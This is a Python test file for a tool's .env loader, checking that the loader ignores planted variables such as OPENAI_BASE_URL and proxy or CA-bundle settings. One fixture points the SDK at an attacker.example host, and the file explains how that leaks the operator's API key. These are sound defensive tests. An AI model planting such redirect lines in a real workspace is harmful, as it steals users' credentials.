# SPDX-License-Identifier: MIT
"""A discovered .env must not be able to redirect the operator's credentials."""

import pytest

from sanzaru.dotenv_loader import load_local_dotenv

pytestmark = pytest.mark.unit


def _write_env(directory, body: str):
    (directory / ".env").write_text(body)


def test_a_planted_base_url_is_ignored(tmp_path, monkeypatch, caplog):
    """The exfiltration vector: one line pointing the SDK at an attacker's host.

    AsyncOpenAI reads OPENAI_BASE_URL from the environment itself, so loading it
    from a file in an untrusted workspace sent the operator's real key, as a
    bearer token, to whoever wrote the file (CWE-427).
    """
    _write_env(tmp_path, "OPENAI_API_KEY=sk-real\nOPENAI_BASE_URL=https://attacker.example/v1\n")
    monkeypatch.delenv("OPENAI_BASE_URL", raising=False)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)

    with caplog.at_level("WARNING", logger="sanzaru"):
        load_local_dotenv(tmp_path)

    import os

    assert "OPENAI_BASE_URL" not in os.environ
    # The legitimate half of the documented workflow still loads.
    assert os.environ["OPENAI_API_KEY"] == "sk-real"
    assert "OPENAI_BASE_URL" in caplog.text


# Not just the application base URLs. httpx runs with trust_env=True, so the
# transport variables are a complete MITM of every provider call without naming
# a single sanzaru setting — which is why this is an allowlist and why the list
# below is worth spelling out.
@pytest.mark.parametrize(
    "key",
    [
        "OPENAI_BASE_URL",
        "OPENAI_API_BASE",
        "ELEVENLABS_BASE_URL",
        "DATABRICKS_HOST",
        "HTTPS_PROXY",
        "HTTP_PROXY",
        "ALL_PROXY",
        "SSL_CERT_FILE",
        "REQUESTS_CA_BUNDLE",
        "SANZARU_ALLOW_UNAUTHENTICATED_HTTP",
        "SANZARU_RUN_SECRET",
        "SANZARU_HTTP_TOKEN",
        "SANZARU_IDENTITY_HEADER",
        "SANZARU_REQUIRE_USER_CONTEXT",
    ],
)
def test_credential_and_transport_variables_are_ignored(tmp_path, monkeypatch, key):
    _write_env(tmp_path, f"{key}=attacker-value\n")
    monkeypatch.delenv(key, raising=False)

    load_local_dotenv(tmp_path)

    import os

    assert key not in os.environ, f"{key} must not be settable from a discovered .env"


def test_a_variable_nobody_thought_of_defaults_to_ignored(tmp_path, monkeypatch):
    """The property an allowlist buys: unknown names fail safe."""
    _write_env(tmp_path, "SOME_FUTURE_REDIRECT_VAR=attacker\n")
    monkeypatch.delenv("SOME_FUTURE_REDIRECT_VAR", raising=False)

    load_local_dotenv(tmp_path)

    import os

    assert "SOME_FUTURE_REDIRECT_VAR" not in os.environ


def test_realtime_price_overrides_still_load(tmp_path, monkeypatch):
    """Open-ended by design (one per model), and not a credential concern."""
    key = "SANZARU_REALTIME_PRICE_GPT_REALTIME_2_1"
    _write_env(tmp_path, f"{key}=4,0.4,32,0.4,64,24\n")
    monkeypatch.delenv(key, raising=False)

    load_local_dotenv(tmp_path)

    import os

    assert os.environ[key] == "4,0.4,32,0.4,64,24"


def test_the_documented_variables_still_load(tmp_path, monkeypatch):
    """setup.sh writes exactly these two; the feature has to keep working."""
    _write_env(tmp_path, "OPENAI_API_KEY=sk-abc\nSANZARU_MEDIA_PATH=/tmp/media\n")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("SANZARU_MEDIA_PATH", raising=False)

    load_local_dotenv(tmp_path)

    import os

    assert os.environ["OPENAI_API_KEY"] == "sk-abc"
    assert os.environ["SANZARU_MEDIA_PATH"] == "/tmp/media"


def test_a_real_exported_value_outranks_the_file(tmp_path, monkeypatch):
    _write_env(tmp_path, "OPENAI_API_KEY=sk-from-file\n")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-exported")

    load_local_dotenv(tmp_path)

    import os

    assert os.environ["OPENAI_API_KEY"] == "sk-exported"


def test_no_ancestor_walk(tmp_path, monkeypatch):
    """Only ./.env is read — a file one directory up is not this run's config."""
    workspace = tmp_path / "workspace"
    project = workspace / "project"
    project.mkdir(parents=True)
    _write_env(workspace, "SANZARU_PLANTED=yes\n")
    monkeypatch.delenv("SANZARU_PLANTED", raising=False)

    load_local_dotenv(project)

    import os

    assert "SANZARU_PLANTED" not in os.environ


def test_a_missing_or_unreadable_env_is_not_fatal(tmp_path):
    load_local_dotenv(tmp_path)  # no file at all
    (tmp_path / ".env").mkdir()  # a directory where a file is expected
    load_local_dotenv(tmp_path)
